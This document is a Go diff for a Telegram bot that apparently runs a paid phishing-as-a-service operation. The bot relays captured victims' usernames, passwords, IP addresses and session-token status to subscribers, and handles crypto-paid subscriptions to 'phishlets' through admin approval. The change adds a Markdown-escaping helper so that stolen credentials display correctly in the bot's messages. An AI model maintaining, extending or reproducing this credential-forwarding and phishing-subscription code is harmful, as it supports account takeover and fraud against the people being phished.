@@ -452,7 +452,7 @@ func (b *TelegramBot) handleAdmin(msg *tgbotapi.Message, cmd string, parts []str
 			}
 			lines = append(lines, fmt.Sprintf(
 				"%s `%s` / `%s` — `%s` — `%s`",
-				status, s.Username, s.Password, s.Phishlet, s.RemoteAddr))
+				status, tgEscape(s.Username), tgEscape(s.Password), tgEscape(s.Phishlet), tgEscape(s.RemoteAddr)))
 		}
 		b.send(chatId, "🎯 *Recent Sessions*\n\n"+strings.Join(lines, "\n"))
 
@@ -648,7 +648,7 @@ func (b *TelegramBot) handleUser(msg *tgbotapi.Message, cmd string, parts []stri
 				"TX Hash: `%s`\n"+
 				"Reference ID: `%d`\n\n"+
 				"The admin will verify and activate your subscription shortly. You'll be notified here.",
-			phishletFriendlyName(phishlet), txHash, sub.Id))
+			phishletFriendlyName(phishlet), tgEscape(txHash), sub.Id))
 
 		adminId := b.cfg.GetBotAdminChatId()
 		if adminId != 0 {
@@ -658,7 +658,7 @@ func (b *TelegramBot) handleUser(msg *tgbotapi.Message, cmd string, parts []stri
 					"Phishlet: `%s`\n"+
 					"TX: `%s`\n\n"+
 					"/approve %d | /reject %d",
-				sub.Id, chatId, phishlet, txHash, sub.Id, sub.Id))
+				sub.Id, chatId, tgEscape(phishlet), tgEscape(txHash), sub.Id, sub.Id))
 		}
 
 	case "/renew":
@@ -693,7 +693,7 @@ func (b *TelegramBot) handleUser(msg *tgbotapi.Message, cmd string, parts []stri
 					"Service: `%s`\n"+
 					"TX Hash: `%s`\n\n"+
 					"Admin will verify and extend your subscription.",
-				phishletFriendlyName(phishlet), txHash))
+				phishletFriendlyName(phishlet), tgEscape(txHash)))
 
 			adminId := b.cfg.GetBotAdminChatId()
 			if adminId != 0 {
@@ -703,7 +703,7 @@ func (b *TelegramBot) handleUser(msg *tgbotapi.Message, cmd string, parts []stri
 						"Phishlet: `%s`\n"+
 						"TX: `%s`\n\n"+
 						"/approve %d | /reject %d",
-					id, chatId, sub.Id, phishlet, txHash, id, id))
+					id, chatId, sub.Id, tgEscape(phishlet), tgEscape(txHash), id, id))
 			}
 			return
 		}
@@ -832,7 +832,7 @@ func (b *TelegramBot) handleUser(msg *tgbotapi.Message, cmd string, parts []stri
 			}
 			lines = append(lines, fmt.Sprintf(
 				"🎯 `%s` / `%s`\n   IP: `%s`  %s\n   Time: `%s`",
-				uname, pass, s.RemoteAddr, status,
+				tgEscape(uname), tgEscape(pass), tgEscape(s.RemoteAddr), status,
 				time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")))
 		}
 		b.send(chatId, "📋 *Your Sessions*\n\n"+strings.Join(lines, "\n\n"))
@@ -878,7 +878,7 @@ func NotifySession(lureId int, phishlet, username, password, remoteAddr string, 
 			"🌐 IP: `%s`\n"+
 			"%s\n\n"+
 			"Use /logs to see all sessions.",
-		phishlet, uname, pass, remoteAddr, tokenStatus)
+		tgEscape(phishlet), tgEscape(uname), tgEscape(pass), tgEscape(remoteAddr), tokenStatus)
 
 	GlobalBot.send(sub.NotifyChatId, msg)
 }
@@ -911,6 +911,16 @@ func (b *TelegramBot) expiryLoop() {
 // ─────────────────────────────────────────────────────────────────────────────
 // Helper
 // ─────────────────────────────────────────────────────────────────────────────
+
+// tgEscape escapes characters that break Telegram's legacy Markdown parser
+// when embedding dynamic/user-supplied content inside formatted messages.
+func tgEscape(s string) string {
+	s = strings.ReplaceAll(s, "`", "'")
+	s = strings.ReplaceAll(s, "*", "\\*")
+	s = strings.ReplaceAll(s, "_", "\\_")
+	s = strings.ReplaceAll(s, "[", "\\[")
+	return s
+}
 
 func (b *TelegramBot) send(chatId int64, text string) {
 	m := tgbotapi.NewMessage(chatId, text)
